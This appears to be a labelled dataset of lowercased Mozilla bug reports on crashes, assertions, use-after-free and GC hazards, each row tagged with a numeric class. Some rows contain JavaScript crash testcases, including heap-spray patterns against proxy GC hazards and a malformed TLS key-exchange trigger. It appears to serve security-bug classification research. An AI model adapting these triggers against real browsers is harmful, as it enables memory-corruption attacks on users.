xul.dll nscssframeconstructor constructframesfromitem layout/base/nscssframeconstructor.cpp:5531 7 xul.dll nscssframeconstructor processchildren layout/base/nscssframeconstructor.cpp:9592 8 xul.dll nscssframeconstructor constructframefromiteminternal layout/base/nscssframeconstructor.cpp:3927 9 xul.dll nscssframeconstructor constructframesfromitem layout/base/nscssframeconstructor.cpp:5531 10 xul.dll nscssframeconstructor processchildren layout/base/nscssframeconstructor.cpp:9592 etc	11
add assertion that it s safe to run scripts before dispatching any events and fix the cases when events are dispatched at unsafe time it does n't appear that we check nscontentutils issafetorunscripts before running the event dispatch code we probably should add an assertion to this effect to help catch unsafe event dispatches	11
crash nsbidipresutils resolve variations on bug 429865 s crashtest still cause problems	11
workers possible to release nsglobalwindow on a background thread i m utterly surprised but the nsisupportshashkey implementation actually addrefs/releases its key value when used simple fix	11
unchecked allocations potential buffer overrun in windows font code the code for uniscribe-based text shaping in gfxwindowsfonts.cpp has a number of unchecked uses of nstarray t setlength to resize buffers that will then be passed to uniscribe apis if any of these setlength calls fail due to lack of memory unlikely but conceivable especially with large textruns we d be passing invalid buffers to uniscribe this is being fixed on trunk as part of bug 502906 but that more extensive patch is not intended for the 1.9.2 branch	11
crash typedarraytemplate unsigned char class_constructor jscontext jsobject unsigned int long long while writing some performance tests i made a typo in my code and forgot to write data when updating a pixel colour value this stepped on the imagedata object itself which then causes us to crash in putimagedata var canvas document.getelementbyid c var ctx canvas.getcontext 2d var imgdata data new array 10 10 4 width 10 height 10 imgdata 0 0 ctx.putimagedata imgdata 0 0 i ve attached a test case with the above code click crash me to crash see also	11
use after free in decompiler centos 5 64 bit 24943 invalid read of size 1 24943 at memmove mc_replace_strmem.c:503 24943 by sprintput jsopcode.c:455 24943 by sprintcstring jsopcode.c:463 24943 by decompile jsopcode.c:2079 24943 by decompile jsopcode.c:2988 24943 by decompilecode jsopcode.c:4606 24943 by js_decompilefunction jsopcode.c:4786 24943 by js_decompilefunction jsapi.c:4830 24943 by fun_tostringhelper jsfun.c:1491 24943 by fun_tosource jsfun.c:1508 24943 by js_invoke jsinterp.c:1186	11
finishsharingtitle should skip fixed slots for slow array the following example crashes in multi-threaded shell in finishsharingtitle function test function makeworkerfn id bar return function bar id 0 for let i 0 i 10 i var bar bar.x 0 var a for var j 0 j 100 j a.push makeworkerfn j bar scatter a test the reason for the crash is that for the slow array finishsharingtitle mistreats jsslot_array_length slot as a slot containing gc things and crashes when reinterpreting the array length 100 as jsstring i am not sure about severity of this bug it can not be triggered via the browser since even thread workers does not allow to share anything between threads on other hand there are extensions that use threads with shared objects for them the bug is relevant so i mark it as restricted	11
crash js_interpret or jsscope searchtable or js_lookuppropertywithflags or assertion failure cx throwing at jsops.cpp or assertion failure len 0 at jsops.cpp the 1821-line of which only the last line seems interesting testcase asserts js debug shell on tm tip without j at assertion failure cx throwing at jsops.cpp:3581 and crashes js opt shell on tm tip without j at js_interpret during the course of the reduction many thanks go out to jesse for his great help the asserts varied in message and so did the crash signature location i tested on linux 64-bit while jesse was able to reproduce on mac 32-bit s-s because crashing all over the place is scary assuming sg critical unless otherwise autobisect coming up	11
tm rooting bug in json code 0 in js_hasownproperty cx lookup obj id=4407833796 objp propp at js/src/jsobj.cpp:1588 1 in jo cx vp scx at js/src/json.cpp:318 2 in str cx id=4365160212 holder scx vp callreplacer=false at js/src/json.cpp:506 3 in jo cx vp scx at js/src/json.cpp:361 4 in str cx id=4365160148 holder scx vp callreplacer=false at js/src/json.cpp:506 5 in jo cx vp scx at js/src/json.cpp:361 6 in str cx id=4398776324 holder scx vp callreplacer=true at js/src/json.cpp:506 7 in js_stringify cx vp replacer space=0 cb at js/src/json.cpp:569 8 in js_stringify cx vp replacer space=0 callback writecallback unsigned short const unsigned int void data at js/src/jsapi.cpp:5283 9 in nsjson encodeinternal this writer at dom/src/json/nsjson.cpp:267 10 in nsjson encode this ajson at dom/src/json/nsjson.cpp:93 11 in ns_invokebyindex_p that methodindex=3 paramcount=1 params at xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:208 12 in xpcwrappednative callmethod ccx mode=xpcwrappednative call_method at js/src/xpconnect/src/xpcwrappednative.cpp:2750 13 in xpc_wn_callmethod cx obj argc=1 argv vp at js/src/xpconnect/src/xpcwrappednativejsops.cpp:1770 14 in js_invoke cx argc=1 vp flags=2 at jsinterp.cpp:834 15 in js_interpret cx at jsops.cpp:2237 16 in js_execute at jsinterp.cpp:1103 17 in js_evaluateucscriptforprincipals cx obj principals chars length=16 filename e lineno=1 rval at js/src/jsapi.cpp:4862 18 in js_evaluatescriptforprincipals cx obj principals bytes execute_test nbytes=16 filename e lineno=1 rval at js/src/jsapi.cpp:4826 19 in processargs cx obj argv argc=16 at js/src/xpconnect/shell/xpcshell.cpp:1207 20 in main argc=16 argv envp at js/src/xpconnect/shell/xpcshell.cpp:1885 548 js_stringify jscontext cx jsval vp jsobject replacer jsval space gdb 549 jscharbuffer cb 550 551 xxx stack 552 jsobject stack js_newarrayobject cx 0 null 553 if stack 554 return js_false 555 556 stringifycontext scx cx cb replacer 557 if initializegap cx space scx.gap 558 return js_false gdb 559 560 jsobject obj newobject cx js_objectclass null null 561 if obj 562 return js_false 563 564 if obj defineproperty cx atom_to_jsid cx runtime atomstate.emptyatom 565 vp null null jsprop_enumerate 566 return js_false 567 568 gdb 569 return str cx atom_to_jsid cx runtime atomstate.emptyatom obj scx vp 570 several rooting issues in this function	11
firefox crashes upon closing when selecting display block for everything selector in css with firebug in nslinelayout reflowframe i noticed that firefox can crash upon closedown when you do the following 1 install firebug from and restart 2 load a random xul document in firefox 3 start up firebug for this xul document 4 go to the styles tab on the right and select the selector 5 change the display property to block 6 close firefox crash with i ca n't really say what causes that crash thus component general	11
crash js_getupvar function g foo for a in foo function g eval function for each b in 0 definegetter x function b eval new function yield print b return x crashes js debug and opt shell at js_getupvar near null on tm tip on 10.5.8 autobisect shows this is probably related to bug 488034 the first bad revision is changeset 27186:70111870bcf8 user brendan eich date mon apr 13 14:16:15 2009 0700 summary bug 488034 crash js_getupvar or assertion failure script upvarsoffset 0 at jsinterp.cpp r=mrbkap debug stack exception type exc_bad_access sigbus exception codes kern_protection_failure at crashed thread 0 thread 0 crashed 0 js-dbg-tm-darwin js_getupvar 76 1 js-dbg-tm-darwin js_interpret 111234 2 js-dbg-tm-darwin zl15sendtogeneratorp9jscontext13jsgeneratoropp8jsobjectp11jsgeneratorl 561 3 js-dbg-tm-darwin zl12generator_opp9jscontext13jsgeneratoropplj 610 4 js-dbg-tm-darwin zl14generator_nextp9jscontextjpl 39 5 js-dbg-tm-darwin js_invoke 1503 6 js-dbg-tm-darwin js_internalinvoke 151 7 js-dbg-tm-darwin js_calliteratornext 360 8 js-dbg-tm-darwin js_interpret 20664 9 js-dbg-tm-darwin js_execute 1169 10 js-dbg-tm-darwin js_executescript 54 11 js-dbg-tm-darwin zl7processp9jscontextp8jsobjectpci 458 12 js-dbg-tm-darwin zl11processargsp9jscontextp8jsobjectppci 2272 13 js-dbg-tm-darwin main 953 14 js-dbg-tm-darwin start 209 15 js-dbg-tm-darwin start 41	11
crash nsxblbinding allowscripts it s ranked 276 in the 3.5.5 past 7 days top crash list with 389 crashes 380 on win 9 on osx stack nsxblbinding allowscripts content/xbl/src/nsxblbinding.cpp:1380 nsxblbinding executeattachedhandler content/xbl/src/nsxblbinding.cpp:977 nsxblbinding executeattachedhandler content/xbl/src/nsxblbinding.cpp:975 nsrunnablemethod nsfileuploadcontentstream run xpcom/nsthreadutils.h:278 nscontentutils removescriptblocker content/base/src/nscontentutils.cpp:4344 presshell doflushpendingnotifications layout/base/nspresshell.cpp:4842 presshell flushpendingnotifications layout/base/nspresshell.cpp:4798 nsdocument flushpendingnotifications content/base/src/nsdocument.cpp:6375 nsqueryreferent operator nsweakreference.cpp:88 nscomputeddomstyle getpropertycssvalue layout/style/nscomputeddomstyle.cpp:349 xul.dll there are also 2 crashes on trunk within the past week so it appears the bug has n't been fixed yet	11
assertion this is unsafe with iframe xbl assertion this is unsafe error file users/jruderman/mozilla-central/content/events/src/nseventdispatcher.cpp line 485 this is the assertion just added in bug 531176 i m not sure why i need the settimeout	11
assertion this type of frame ca n't have overflow containers from bug 537631 comment 2 jesse ruderman 2010-04-13 17:43:58 pdt also triggers an assertion recently added in bug 509839 assertion this type of frame ca n't have overflow containers aproperty nscontainerframe overflowcontainersproperty aproperty nscontainerframe excessoverflowcontainersproperty isframeoftype nsiframe ecancontainoverflowcontainers file users/jruderman/mozilla-central/layout/generic/nscontainerframe.cpp line 1212	11
assertion failure isqname at jsobjinlines.h or assertion failure obj getclass js_namespaceclass.base isqnameclass obj getclass at jsxml.cpp with e4x gczeal 1 x x x print x x asserts js debug shell on tm tip without j at assertion failure isqname at jsobjinlines.h:333 tested on 64-bit mac 10.6.3 setting s-s because this involves gczeal	11
string buffer underflow and crash nstextboxframe updateaccesstitle nstextboxframe updateaccesstitle tried to subtract 1 from 0 and got 2^32-1 assertion index exceeds allowable range i mlength file nststring.h line 129 at least on a 64-bit system a crash immediately follows the assertion 5 in nsstring charat this i=4294967295 at dist/include/nststring.h:130 6 in nsstring operator this i=4294967295 at dist/include/nststring.h:135 7 in nstextboxframe updateaccesstitle this at layout/xul/base/src/nstextboxframe.cpp:878 8 in nstextboxframe updateaccesskey this aweakthis at layout/xul/base/src/nstextboxframe.cpp:264 9 in nsasyncaccesskeyupdate reflowfinished this at layout/xul/base/src/nstextboxframe.cpp:224	11
assertion failure isnative after global.__proto the following scripts gives an assert in debug builds m/tm/js/src cat s/x.js this.__proto print length m/tm/js/src build/js/tdbg/js s/x.js assertion failure isnative at home/igor/m/tm/js/src/jsscope.h:549 aborted	11
crash js_lookuppropertywithflags or assertion failure isnative for a 0 a 8 a if a proxy.create t crashes js opt shell on tm tip with j at js_lookuppropertywithflags and asserts js debug shell on tm tip with j at assertion failure isnative at jsscope.h:549 tested on 64-bit ubuntu linux 10.04 and changeset tm-42457-f423fbc93e3f assuming related to harmony proxies does n't seem related to bug 566908 console stdout program received signal sigsegv segmentation fault in js_lookuppropertywithflags gdb bt 0 in js_lookuppropertywithflags 1 in js tracerecorder test_property_cache jsobject nanojit lins jsobject js pcval 2 in js tracerecorder record_jsop_callprop 3 in js tracerecorder monitorrecording jsop 4 in js_interpret 5 in js_execute 6 in js_executescript 7 in process jscontext jsobject char int 8 in main gdb x/i rip js_lookuppropertywithflags+189 cmp rdx rbx gdb x/b rdx can not access memory at address	11
nscomarray is inconsistent with the order in which it releases and removes elements from the array which can cause a refcount to be decreased more than necessary see bug 570350 comment 6 about what caused me to discover this issue when nscomarray clear is called the interfaces are released before they re actually removed from the array so given an interface which calls nscomarray removeobject or other similar methods from its release method you could get into situations where an object is attempted to be removed twice and therefore decrementing its refcount more than necessary i also see similar things in other methods handling removing items from nscomarrays i think we should have a well-defined order of removing the object from the array and then calling release on it in order to avoid such problems the reason that i m filing this in the security group is that it is theoretically possible to study our code to determine places in the code where this might happen either now or in the future and then construct a scenario when this caused an object to be deleted with outstanding interface pointers to it and then use the dangling pointer in combination with other techniques to construct an attach scenario	11
code that iterates through nscssvalue arrays should use size_t for index now now that bug 574059 landed and nscssvalue array count returns a size_t instead of pruint16 we need to do a s/pruint16/size_t on code that iterates through these arrays too e.g 278 nscssvalue array array avalue.getarrayvalue 330 for pruint16 index 1 index array count index 331 appendcssvaluetostring aproperty array item index aresult 332 333 if we re not at the final element append a comma 334 if index 1 array count 335 aresult.appendliteral 336	11
new crash executetree in firefox 3.6b3 there s a new crash in firefox 3.6b3 with the signature executetree in firefox 3.6b3 that has n't been seen in any of the versions 3\.5 so far we ve seen 78 of these crashes in the wild please see for more crash info	11
tm crash js_valuetostring segfault when accessing out-of-range arguments on trace vim set ts=4 sw=4 tw=99 et function f this.search function a b c arguments 3 arguments.length 4 for var i 0 i 100 i print arguments 3 var o new f o.search x 1 y 1 w 100600 h 100600	11
crash nanojit lins opcode with non-native proto this.__proto proxy.create has function return false function eval function for var j=0 j 6 j if j 2==1 p=0 triggers one of the following all in a debug build crash nanojit lins opcode crash nanojit lirwriter insimmi assertion failed 0 nanojit/lir.cpp:996 assertion failure status arecord_completed status arecord_aborted status arecord_error at jstracer.cpp:7139 the proliferation of assertions and crashes may make this annoying for jsfunfuzz	11
assertion caller forgot to check readytoexecutescripts user-agent mozilla/5.0 x11 u linux x86_64 en-us rv:1.9.1.7pre gecko/20091203 shiretoko/3.5.7pre build identifier mozilla/5.0 x11 u linux x86_64 en-us rv:1.9.1.7pre gecko/20091203 shiretoko/3.5.7pre while trying to get a website working with firefox using greasemonkey to inject proper javascript the whole site is written with ie6-specific gunk i ran into a problem where firefox deadlocks attempting to run scripts on the page unfortunately the website in question is the hr site for my employer i m unable to provide credentials for login i ll try to get a local copy of the html+scripts just to see if i can reproduce the deadlock without logging into the actual server i built firefox from mozilla-1.9.1 repository today with debugging symbols enabled and loaded it into gdb there is a spew of console output the following lines repeated indefinitely assertion caller forgot to check readytoexecutescripts readytoexecutescripts nscontentutils issafetorunscript file home/osterj/other-projects/mozilla-1.9.1/content/base/src/nsscriptloader.cpp line 585 assertion inner window detected in equality hook win isouterwindow file home/osterj/other-projects/mozilla-1.9.1/dom/src/base/nsdomclassinfo.cpp line 6653 assertion inner window detected in equality hook other isouterwindow file home/osterj/other-projects/mozilla-1.9.1/dom/src/base/nsdomclassinfo.cpp line 6659 at some point the unresponsive script dialog opens but it is completely empty the dialog contains no controls and sometimes even no title the assertion spews in the console are still dumping at this point mandatory kill i have a simple backtrace from halting the process during the assertion spew will attach reproducible always	11
assertion this is unsafe fix the caller and more with mutation events xbl contenteditable loading the testcase triggers a bunch of assertions assertion no frame see bug 188946 frame file editor/libeditor/base/nseditor.cpp line 3968 assertion recurring into frame construction mprescontext mlayoutphasecount elayoutphase_framec 0 file layout/base/nsprescontext.h line 1262 assertion want to fire mutation events but it s not safe anode isnodeoftype nsinode econtent static_cast nsicontent anode isinnativeanonymoussubtree sscriptblockercount sremovablescriptblockercount file content/base/src/nscontentutils.cpp line 3392 assertion killing mutation events nscontentutils issafetorunscript file content/base/src/nscontentutils.cpp line 5941 assertion this is unsafe fix the caller error file content/events/src/nseventdispatcher.cpp line 514 and then the last two assertions repeat	11
gc hazard with lookupproperty callers with non-native objects most if not all all callers of lookupproperty pass pointer to unrooted jsobject from the native stack for the objp parameter the assumption is that objp would be either the original rooted object or would come from the prototype in which case it would be rooted by the original object but proxy breaks that assumption since the has method implementing lookupproperty can remove proxy from the prototype chain unrooting and garbage-collecting the proxy the following test demonstrates that object.prototype.__proto proxy.create get has object.prototype.__proto null gc return function name print 1 return name a a in it generates home/igor/s/y.js:12 typeerror proxy was fixed while executing the handler that error comes from isproxy check to verify that the class is still a proxy this is potentially exploitable since the script can use the pattern above recursively with 1000 or so proxies per one gc cycle and eventually learn the address of js_proxyclass and pass isproxy check as a workaround the proxy can root the proxy argument to all proxy methods implementing jsobjectops but the right solution it seems to require a conservative stack scanner for the proxies	11
js_invokeconstructor with clampreturn==js_true and user-controlled ctor is a gc hazard see bug 567577 comment 9 and bug 567577 comment 10 i think we either need to add a tvr for the noted default-return object in js_invokeconstructor or figure out whether nosuchmethod functionality can ever be invoked in a constructing situation the latter is probably hard and the former is probably easy which suggests probably the former is what we should do this also shows up in js_new on trunk but conservative stack scanning saves us and in fun_applyconstructor narcissus-only so i think we do n't care but neither of these cases needs a change	11
tm crash jsobject getclass for x 0 x 4 x z function crashes js debug shell with j on tm tip at jsobject getclass program received signal exc_bad_access could not access memory reason kern_protection_failure at address in jsobject getclass this at jsobj.h:306 306 return clasp gdb bt 0 in jsobject getclass this at jsobj.h:306 1 in jsobject isfunction this at jsfun.h:253 2 in isfunctionobject v at jsfun.h:277 3 in js nativetovalue cx v type=jsval_type_nonfunobj slot at jstracer.cpp:2825 4 in js flushnativestackframevisitor visitstackslots this vp count=2 fp at jstracer.cpp:3003 5 in js visitframeslots js flushnativestackframevisitor visitor cx depth=0 i up at jstracer.cpp:1787 6 in js visitstackslots js flushnativestackframevisitor visitor cx calldepth=0 at jstracer.cpp:1809 7 in js flushnativestackframe cx calldepth=0 mp np stopframe ignoreslots=0 at jstracer.cpp:3372 8 in js leavetree tm state lr at jstracer.cpp:7025 9 in js deepbail cx at jstracer.cpp:7952 10 in js leavetrace cx at jscntxt.h:2959 11 in js_gettopstackframe cx at jscntxt.h:2995 12 in function cx obj argc=0 argv rval at jsfun.cpp:2128 13 in 14 in js executetrace cx f state at jstracer.cpp:6598 15 in js executetree cx f inlinecallcount innermostnestedguardp lrp at jstracer.cpp:6699 16 in js monitorloopedge cx inlinecallcount reason=js record_branch at jstracer.cpp:7186 17 in js interpret cx at jsinterp.cpp:3386 18 in js execute cx chain script down flags=0 result at jsinterp.cpp:904 19 in js_executescript cx obj script rval at jsapi.cpp:4662 20 in process cx obj filename forcetty=0 at shell/js.cpp:532 21 in processargs cx obj argv argc=1 at shell/js.cpp:853 22 in shell cx argc=1 argv envp at shell/js.cpp:4949 23 in main argc=1 argv envp at shell/js.cpp:5036 gdb x/i eip znk8jsobject8getclassev+9 mov eax eax gdb x/b eax can not access memory at address	11
we use the wrong domci for documentfragment we use the wrong dom classinfo for documentfragment nodes nsdomgenericsh instead of nsnodesh this means we do n't force the parent of the documentfragment nodes to be their ownerdocument if the ownerdocument is reparented then the wrapper for the ownerdocument and the documentfragment node end up in different xpcwrappednativescopes if then at some point we forcibly try to reparent the wrapper for the documentfragment node for example through adoptnode we try to remove the wrapper from the xpcwrappednativescope of the ownerdocument s wrapper but we do n't find it there we then add the wrapper to a different xpcwrappednativescope and so the wrapper is now in two xpcwrappednativescopes when the wrapper is then destroyed it remove itself from one of the two xpcwrappednativescopes but we end up with a stale reference to it in the other xpcwrappednativescope at some point we ll enumerate the wrapper in all the scopes and hit the stale reference it looks like this might lead to several different crashes one is in wrappednativemarker bug 520554 i ve also seen it crash in wrappednativetearoffsweeper and crashes in xpcwrappednative isvalid no bug and xpcwrappednativescope tracejs bug 537822 look suspicious too this looks a lot like the pwn2own 2010 bug bug 555109 with a slightly different cause	11
textrunwordcache maketextrun does n't null check new result this might be the reason for bug 583077 at least on branches	11
evil tls server can crash all firefox from at least 3.0 3.6 windows linux user-agent mozilla/4.0 compatible msie 7.0 windows nt 5.1 net clr 1.1.4322 net clr 2.0.50727 net clr 3.0.4506.2152 net clr 3.5.30729 build identifier mozilla/5.0 windows u windows nt 5.1 en-gb rv:1.9.2 gecko/20100115 firefox/3.6 net clr 3.5.30729 when using dhe cipher suites a correctly crafted server key exchange message will crash firefox struct opaque dh_p 1 2^16-1 opaque dh_g 1 2^16-1 opaque dh_ys 1 2^16-1 serverdhparams ephemeral dh parameters dh_p can be zero length dh_g can be zero length but when dh_ys is zero length firefox crashes example encoding 00 00 00 00 00 00 signature on key is validated first so easiest done by evil tls server tm reproducible always steps to reproduce modify tls server to send a 0 length dh_ys actual results on linux firefox vanishes on windows crash report application comes up expected results rejection of invalid dh params some similar bad parameters are caught with errors about memory allocation failure	4
firefox detects wo n't work with server doing ssl dhe cipher suites with tiny keys the above link caused a malformed ssl handshake in both minefield nightly and beta 2 the page loaded properly in beta 1 and 3.6.8	4
better error reporting for tiny ephemeral diffie-hellman dhe keys in server key exchange the proposed patch adds a new error code ssl_error_weak_server_key for the dh_p size check in ssl3_handleserverkeyexchange note that firefox will display the string ssl_error_weak_server_key in its error page so the name of this error code needs to be descriptive enough and needs to make it clear the server is at fault we can consider adding a new error code for invalid dh_g and dh_ys parameters in the same function right now we use the default ssl_error_rx_malformed_server_key_exch which seems appropriate for invalid dh parameters would ssl_error_server_key_exchange_failure be better	4
update to nss_3_12_8_rtm in mozilla-central mozilla-central is using nss_3_12_8_beta2 i d like to update to nss_3_12_8_beta3 i summarize the changes between beta 2 and beta 3 below for mozilla drivers bug fixes of interest to mozilla bug 578697 cve-2010-3170 browser wildcard certificate validation issue bug 582575 add july 2010 batch of roots to nss bug 536640 valgrind warning in decodeitem about uninitialized local from nsslowkey_decodepw bug 588698 ssl deadlock seen in thunderbird bug 567134 use aslr in nss if it s available other important bug fixes bug 587234 better error reporting and checks for weak server keys in libssl bug 585842 cert_makecanickname returns static string in error case bug 586953 cert_formatname leaks everything if it ca n't port_alloc for buf bug 586957 cert_formatname leaks things if properties exist multiple times bug 586967 cert_createcertificate leaks arena if port_arenazalloc fails bug 587399 crmf_copy_cert_req_msg leaks poolp if newreqmsg port_arenaznew fails bug 588052 nsslowhash.h missing from dist/public/nss bug 587622 print_attr_value calls get_obj_class instead of get_key_type for cka_key_type bug 584871 calling sec_pkcs12decoderstart with null dopen dclose dread dwrite darg leads to leaks bug 584875 contents of sec_pkcs12encodercontext are only freed on error handling case bug 587432 nss_cmssignerinfo_sign leaks tmppoolp when things fail bug 586697 ssl3_derivemastersecret must not request pversion when it does master key derivation for diffie-hellman through pkcs11 bug 525092 allow one more ssl function to be called early minor bug fixes bug 585247 nss coreconf add rpath-link to ldflags for maemo/scratchbox bug 586857 mark sec_oid_ns_cert_ext_ssl_server_name as an unsupported certificate extension bug 587393 remove jar_cert_attribute declaration	4
tm assertion failed lir type error start of writer pipeline arg 1 of fmul is int which has type int32 expected float64 0 nanojit/lir.cpp or assertion failure m tt_int32 isint32 vp at jstracer.cpp x true function for each let c in 0 x arguments 4 c asserts js debug shell on jm tip with m and j at assertion failed lir type error start of writer pipeline arg 1 of fmul is int which has type int32 expected float64 0 nanojit/lir.cpp:2610	11
stack corruption in windows nsiconchannel makeinputstream due to getdibits being incorrectly used i can reproduce this on the official builds mozilla/5.0 windows windows nt 6.1 wow64 rv:2.0b3 gecko/20100805 firefox/4.0b3 as well as on mozilla/5.0 windows nt 6.1 wow64 rv:2.0b5pre gecko/20100823 minefield/4.0b5pre net clr 3.5.30729 however i ca n't reproduce this on a debug build either vc8 or vc10 a call in nsiconchannel makeinputstream 1 to win32 s getdibits 2 seems to clobber the stack on returning this happens whenever this point in code is reached in most cases those locations are n't touched any more however in at least one case at least one location is when stockicon 3 contains a shared string during its destruction that value on the stack now is used an easy way to trigger a crash on windows 7 using it is to load the url moz-icon stock/uac-shield this immediately causes a crash e.g 4 which i submitted 1 538 2 the call is in 632 3 551 4 there does n't seem to be anything obviously wrong with the api calls this might be something hidden in the api or a codegen/pgo bug	11
crash nssvgglyphframe getextentofchar with getextentofchar 0 see testcase which crashes current trunk build and firefox3.6.8 0 xul.dll nssvgglyphframe getextentofchar layout/svg/base/src/nssvgglyphframe.cpp:1077 1 xul.dll nssvgtextcontainerframe getextentofchar layout/svg/base/src/nssvgtextcontainerframe.cpp:195 2 xul.dll nssvgtextelement getextentofchar content/svg/content/src/nssvgtextelement.cpp:324 3 xul.dll ns_invokebyindex_p xpcom/reflect/xptcall/src/md/win32/xptcinvoke.cpp:102 4 xul.dll js invokecommon int js/src/jsinterp.cpp:566 5 xul.dll js invoke js/src/jsinterp.cpp:699 6 xul.dll js interpret js/src/jsinterp.cpp:4709 7 xul.dll js execute js/src/jsinterp.cpp:883 8 xul.dll js_evaluateucscriptforprincipals js/src/jsapi.cpp:4769 9 xul.dll nsjscontext evaluatestring dom/base/nsjsenvironment.cpp:1811 10 xul.dll nsscriptloader evaluatescript content/base/src/nsscriptloader.cpp:767 11 xul.dll nsscriptloader processrequest content/base/src/nsscriptloader.cpp:677 12 xul.dll nsscriptloader processscriptelement content/base/src/nsscriptloader.cpp:617 13 xul.dll nsscriptelement maybeprocessscript content/base/src/nsscriptelement.cpp:195 14 xul.dll nssvgscriptelement doneaddingchildren content/svg/content/src/nssvgscriptelement.cpp:280 15 xul.dll nsxmlcontentsink closeelement etc	11
crash js_valuetostring no description provided	11
vorbis_staticbook_unpack does n't handle failure from oggpack_read 149 int vorbis_staticbook_unpack oggpack_buffer opb static_codebook s 158 s dim=oggpack_read opb,16 159 s entries=oggpack_read opb,24 160 if s entries==-1 goto eofout	11
gc hazard in marksharpobjects consider the following code in marksharpobject l276 ok obj lookupproperty cx id obj2 prop ok obj2 getattributes cx id prop attrs if ok if obj2 isnative attrs jsprop_getter jsprop_setter jsscopeproperty sprop jsscopeproperty prop val jsval_void if attrs jsprop_getter val sprop gettervalue if attrs jsprop_setter if val jsval_void mark the getter then set val to setter ok marksharpobjects cx jsval_to_object val null null obj2 dropproperty cx prop this code has a bug as it can start a long-running operation between lookupproperty and dropproperty calls due to a recursion in marksharpobjects without the proposed changes from the bug 546590 this can only hurt embeddings that share objects between threads as it may nests locks itc for the browser this is harmless as lookupproperty/getattributes at worst can run a resolve hook and their implementation in the browser do not run arbitrary code but proxies chnage that now lookupproperty can run an arbitrary script thus if marksharpobjects for the setter discovers a proxy it could run a script that can delete the property under lookup and its scope that would lead to a hazard	11
gc hazard in obj_tosource obj_tosource contains the following pattern obj lookupproperty cx id obj2 prop obj getproperty cx id val 0 obj2 dropproperty cx prop similarly to the bug 566141 the code calls obj2 dropproperty after doing potentially complex operations again as with the bug 566141 the proxies makes the bug easier to exploit but afaics on branches the liveconnect can be used to archive the same results as the getproperty call can run arbitrary java code that can in turn call js here is a test case that crashes the current tm tip var obj x 0 make a proxy property of a getter/setter so enumerateown will be invoked during initial scanning of the object tree the function than deletes a property from the object so property lookup during the enumeration will go into prototype function f f.p proxy.create enumerateown function delete obj.x return obj.__definegetter__.call obj a f obj.__definesetter__.call obj a f var buffer for var i 0 i 4000 i buffer.push function force_gc print gc buffer null gc buffer for var i 0 i 1e5 i buffer.push 123456 substring 1 make another proxy a prototype of object.prototype the has method for this proxy is called for the deleted property x during attribute lookup in obj_tosource the method restores object.prototype.__proto back to null and defines a getter for the x on the original object this getter triggers gc that collects now unrooted proxy object and spray the freed gc arenas with strings leading to a crash during dropproperty call object.prototype.__proto proxy.create has function name if name x object.prototype.__proto null obj.__definegetter x force_gc return true return false getownpropertydescriptor function name return obj.tosource	11
gc hazards in js_setwatchpoint with proxies js_setwatchpoint contains the following fragment if js_lookupproperty cx obj propid pobj prop return js_false else if pobj obj if pobj isnative else if pobj getproperty cx propid value pobj getattributes cx propid prop attrs pobj dropproperty cx prop recall that obj is native whether or not pobj is native if js_definenativeproperty cx obj propid value getter setter attrs flags shortid prop return js_false there are 2 bugs here first dropproperty is called after getproperty call that can run arbitrary scripts either via proxies or liveconnect on older branches this could be problematic if obj becames thread-shared but in general this is not exploitable in the default firefox configuration second the value passed to the getproperty call is not rooted with proxies this becomes a gc hazard since the proxy can overwrite both getproperty to return newborn object and getattributes to force the gc to collect it before it is stored using js_definenativeproperty note that this is not exploitable with liveconnect since the implementation of getattributes in the java bridge is trivial and can not trigger the gc here is an example demonstrating the second bug function force_gc buffer null gc buffer for var i 0 i 1e5 i buffer.push 123456 substring 1 var buffer for var i 0 i 4000 i buffer.push point obj to a proxy where the get method creates anew object and getownpropertydescriptor collects it when called from var obj proto proxy.create has function name return name x get function name print 111 return getownpropertydescriptor function name force_gc return object.prototype.watch.call obj x function uneval obj.x regarding branch nomination currently i do not see how the bug could affect the older branches but it is better to play safe and make sure that the problem is fixed everywhere rather than hoping that the analysis is correct	11
crash nsselectionstate dotraverse with textarea changing root assertion bad action nesting mactionnesting 0 file editor/libeditor/text/nstexteditrules.cpp line 250 assertion zero or negative placeholder batch count when ending batch mplaceholderbatch 0 file editor/libeditor/base/nseditor.cpp line 876 crash nsselectionstate dotraverse	11
assertion killing mutation events in nsmenuframe updatemenutype assertion want to fire mutation events but it s not safe anode isnodeoftype nsinode econtent static_cast nsicontent anode isinnativeanonymoussubtree sscriptblockercount sremovablescriptblockercount file content/base/src/nscontentutils.cpp line 3619 assertion killing mutation events nscontentutils issafetorunscript file content/base/src/nscontentutils.cpp line 6142 assertion this is unsafe fix the caller error file content/events/src/nseventdispatcher.cpp line 514 security-sensitive because previous bugs with these assertions bug 557398 bug 564461 were deemed to be likely-exploitable	11
activecontent in nseventstatemanager posthandleevent looks unsafe the variable is nsicontent but scripts may run before it is used i do n't have a testcase but based on code this might lead to crash when using image maps and deleting the image element when it gets focus or something like that	11
status bar is incorrectly shown when dbcs filename loaded step 1 open navigator 2 d d dbcs filename to mozilla window result dbcs filename is incorrectly shown on status bar	9
font-face investigate support for opentype sanitizer library google has published their opentype sanitizer library this library essentially validates opentype fonts on a table-by-table basis reconstructing each on the fly chromium tracking bug integration into webkit the question here is whether this revalidation is worthwhile or whether it s just enforcing spec-correctness that does n't actually guarantee safety	9
another crash getchildlistnamefor with moz-column position absolute assertion out-of-flow is already in the destroy queue adestroyqueue.indexof outofflowframe knotfound file users/jruderman/central/layout/base/nscssframeconstructor.cpp line 9240 crash getchildlistnamefor dereferencing like in bug 411835	11
gc hazard with lookupproperty callers with scripted proxy handlers lookupproperty and other object ops calls might not root obj	11
crash buildtextrunsscanner breaksink setbreaks unsigned int unsigned int unsigned char with crazy moz-column testcase no description provided	11
potential overflow in xml_setnamespace fast native xml_setnamespace can write to vp 2 when argc 0 here is the relevant code static jsbool xml_setnamespace jscontext cx uintn argc jsval vp jsobject qn jsobject ns jsval qnargv 2 jsxml nsowner non_list_xml_method_prolog if jsxml_has_name xml return js_true xml check_copy_on_write cx xml obj if xml return js_false ns js_constructobject cx js_namespaceclass null obj argc 0 0 1 valueify vp 2 if ns return js_false vp 0 object_to_jsval ns ns setnamespacedeclared jsval_true qnargv 0 vp 2 object_to_jsval ns qnargv 1 object_to_jsval xml name	11
crash nssvgpathelement getmarkpoints no description provided	11
assertion no text for isspace with wrapping inside table cell assertion no text for isspace apos afrag getlength file layout/generic/nstextframethebes.cpp line 627 assertion bad index pruint32 aindex mstate.mlength file nstextfragment.h line 204	11
